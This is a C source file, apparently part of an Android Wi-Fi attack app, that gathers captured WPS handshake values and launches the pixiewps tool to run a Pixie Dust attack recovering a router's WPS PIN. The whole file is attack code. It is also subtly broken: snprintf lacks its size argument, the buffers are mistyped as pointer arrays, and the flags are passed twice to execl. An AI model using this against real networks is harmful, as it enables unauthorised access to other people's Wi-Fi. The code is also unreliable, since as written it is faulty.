#include <sys/types.h>
#include "pixie.h"
#include "globule.h"
#include <stdio.h>
#include <stdlib.h>

struct pixie pixie = {0};

void pixie_format(const unsigned char *in, unsigned len, char *outbuf) {
	unsigned i;
	char *out = outbuf;
	for(i = 0; i < len; i++, out+=2) {
		sprintf(out, "%02x", in[i]);
	}
	if(i) *out = 0;
}

void pixie_attack(void) {
	struct pixie *p = &pixie;
	int dh_small = get_dh_small();

	if(p->do_pixie) {
	const char *evilairborn0[4098];
	const char *evilairborn1[4038];
	const char *evilairborn2[4038];
	const char *evilairborn3[4038];
	const char *evilairborn4[4038];
	const char *evilairborn5[4038];
	
snprintf(evilairborn0, "-e %s",p->pke);
snprintf(evilairborn1, "-s %s",p->ehash1);
snprintf(evilairborn2, "-z %s",p->ehash2);
snprintf(evilairborn3, "-a %s",p->authkey);
snprintf(evilairborn4, "-n %s",p->enonce);
snprintf(evilairborn5, "-r %s",p->pkr);
execl("/data/data/com.hijacker/files/bin/pixiewps","pixiewps","-e",evilairborn0,"-s",evilairborn1,"-z",evilairborn2,"-a",evilairborn3,"-n",evilairborn4,"-r",evilairborn5,(char *)NULL);
exit(0);}
	PIXIE_FREE(authkey);
	PIXIE_FREE(pkr);
	PIXIE_FREE(pke);
	PIXIE_FREE(enonce);
	PIXIE_FREE(ehash1);
	PIXIE_FREE(ehash2);
}